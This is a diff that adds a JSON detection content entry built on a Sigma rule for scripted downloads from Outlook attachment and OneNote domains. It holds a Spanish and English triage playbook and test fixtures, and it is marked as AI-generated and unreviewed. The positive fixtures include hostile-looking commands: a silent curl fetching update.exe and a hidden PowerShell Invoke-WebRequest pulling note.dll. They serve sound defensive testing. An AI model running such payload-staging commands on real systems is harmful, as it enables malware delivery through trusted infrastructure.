@@ -1,0 +1,130 @@
+{
+  "rule": {
+    "id": "00d49ed5-4491-4271-a8db-650a4ef6f8c1",
+    "title": "Suspicious Download from Office Domain",
+    "level": "high",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_susp_download_office_domain.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_susp_download_office_domain.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1105",
+      "T1608"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso usó una utilidad de descarga o un método de descarga de PowerShell para obtener un archivo desde un dominio de Microsoft que almacena adjuntos de Outlook o contenido de OneNote. Los atacantes pueden abusar de estos dominios de confianza para alojar y entregar payloads.",
+      "what_it_detects": "Creación de procesos donde Image termina en curl.exe o wget.exe, o CommandLine contiene Invoke-WebRequest, iwr, curl, wget, Start-BitsTransfer, .DownloadFile( o .DownloadString(, y además CommandLine contiene https://attachment.outlook.live.net/owa/ o https://onenoteonlinesync.onenote.com/onenoteonlinesync/.",
+      "why_it_matters": "Ingress Tool Transfer (T1105) y Stage Capabilities (T1608): el atacante sube un payload como adjunto de correo o de OneNote y luego lo descarga desde un dominio de Microsoft que proxies y listas permitidas rara vez bloquean.",
+      "triage_steps": [
+        "Revise el CommandLine completo: anote la URL, la ruta de salida (-o, -OutFile, argumento de destino) y opciones que oculten la salida u omitan validación TLS.",
+        "Revise ParentImage y el árbol de procesos: una aplicación de Office, un script host, cmd.exe o una tarea programada como padre es más sospechoso que una consola administrativa interactiva.",
+        "Identifique al usuario y determine si normalmente ejecuta descargas con curl, wget o PowerShell en este host.",
+        "Ubique el archivo descargado en disco, obtenga su hash, consulte su reputación y busque su ejecución en eventos de procesos posteriores.",
+        "En el mismo host, revise eventos de procesos, red y archivos en +/- 15 minutos buscando ejecución, persistencia o conexiones salientes a destinos nuevos.",
+        "Determine a qué buzón o bloc de OneNote apunta el token de la URL y si un correo de phishing relacionado llegó al usuario.",
+        "Busque alertas previas para el host y el usuario, y busque la misma URL o hash en el resto del parque."
+      ],
+      "false_positives": [
+        "Scripts administrativos o de automatización que descargan adjuntos de Outlook 365 u OneNote para archivado, migración o procesamiento.",
+        "Desarrolladores o personal de TI que prueban la descarga de adjuntos con curl o PowerShell."
+      ],
+      "response_steps": [
+        "Confirme con el usuario o el responsable del script si la descarga era esperada y valide la legitimidad del archivo.",
+        "Si es malicioso, aísle el endpoint y detenga los procesos relacionados después de preservar evidencia de memoria y procesos.",
+        "Ponga en cuarentena el archivo descargado, bloquee su hash y elimine el correo o contenido de OneNote de origen.",
+        "Restablezca las credenciales de la cuenta afectada si se sospecha abuso de token o sesión, y busque la misma actividad en otros hosts.",
+        "Restaure el host a un estado confiable si se confirma ejecución o persistencia."
+      ],
+      "severity_rationale": "El nivel alto es adecuado porque las descargas por script desde dominios que alojan adjuntos son poco comunes en uso legítimo y apuntan directamente a preparación de payloads mediante infraestructura de confianza."
+    },
+    "en": {
+      "summary": "A process used a download utility or PowerShell download method to fetch a file from a Microsoft domain that stores Outlook email attachments or OneNote content. Attackers can abuse these trusted domains to host and deliver payloads.",
+      "what_it_detects": "Process creation where Image ends with curl.exe or wget.exe, or CommandLine contains Invoke-WebRequest, iwr, curl, wget, Start-BitsTransfer, .DownloadFile( or .DownloadString(, and CommandLine also contains https://attachment.outlook.live.net/owa/ or https://onenoteonlinesync.onenote.com/onenoteonlinesync/.",
+      "why_it_matters": "Ingress Tool Transfer (T1105) and Stage Capabilities (T1608): an attacker uploads a payload as an email or OneNote attachment, then pulls it from a trusted Microsoft domain that proxies and allowlists rarely block.",
+      "triage_steps": [
+        "Read the full CommandLine: note the URL, output path (-o, -OutFile, destination argument) and any options that hide output or skip TLS checks.",
+        "Check ParentImage and the process tree: an Office app, script host, cmd.exe or scheduled task as parent is more suspicious than an interactive admin console.",
+        "Identify the user and decide whether they normally run curl, wget or PowerShell downloads on this host.",
+        "Find the downloaded file on disk, get its hash, check reputation and look for its execution in later process events.",
+        "On the same host, review process, network and file events within +/- 15 minutes for execution, persistence or outbound connections to new destinations.",
+        "Find out which mailbox or OneNote notebook the URL token points to, and whether a related phishing email reached the user.",
+        "Look for earlier alerts for this host and user, and search the fleet for the same URL or file hash."
+      ],
+      "false_positives": [
+        "Admin or automation scripts that download Outlook 365 or OneNote attachments for archiving, migration or processing.",
+        "Developers or IT staff testing attachment retrieval with curl or PowerShell."
+      ],
+      "response_steps": [
+        "Verify with the user or script owner whether the download was intended and check the file's legitimacy.",
+        "If malicious, isolate the endpoint and stop related processes after preserving memory and process evidence.",
+        "Quarantine the downloaded file, block its hash and remove the source email or notebook content.",
+        "Reset credentials for the affected account if token or session abuse is suspected, then hunt for the same activity on other hosts.",
+        "Restore the host from a known good state if execution or persistence is confirmed."
+      ],
+      "severity_rationale": "High fits because scripted downloads from attachment-hosting domains are rare in legitimate use and point directly to payload staging through trusted infrastructure."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "curl.exe launched from cmd.exe downloads an executable from an Outlook attachment URL",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\curl.exe",
+          "CommandLine": "curl.exe -s -o C:\\Users\\jperez\\AppData\\Local\\Temp\\update.exe https://attachment.outlook.live.net/owa/jperez@example.com/service.svc/s/GetAttachmentThumbnail?id=AAMkAGI2TAAA&thumbnailType=2&token=PLACEHOLDER",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c run.bat",
+          "CurrentDirectory": "C:\\Users\\jperez\\Downloads\\"
+        }
+      },
+      {
+        "description": "PowerShell Invoke-WebRequest pulls a file from the OneNote online sync domain",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -nop -w hidden -c Invoke-WebRequest -Uri 'https://onenoteonlinesync.onenote.com/onenoteonlinesync/onenote/api/v1.0/resource/PLACEHOLDER/content' -OutFile $env:TEMP\\note.dll",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\ONENOTE.EXE",
+          "CurrentDirectory": "C:\\Users\\mrojas\\Documents\\"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "User opens an Outlook attachment link in Edge; no download utility or download method in the command line",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+          "CommandLine": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --single-argument https://attachment.outlook.live.net/owa/jperez@example.com/service.svc/s/GetFileAttachment?id=AAMkAGI2TAAA",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"
+        }
+      },
+      {
+        "description": "curl.exe downloads an installer from an internal non-Microsoft domain",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0310.andes.example.com",
+          "User": "ANDES\\lgomez",
+          "Image": "C:\\Windows\\System32\\curl.exe",
+          "CommandLine": "curl.exe -o C:\\Temp\\agent.msi https://downloads.example.com/agent/agent.msi",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
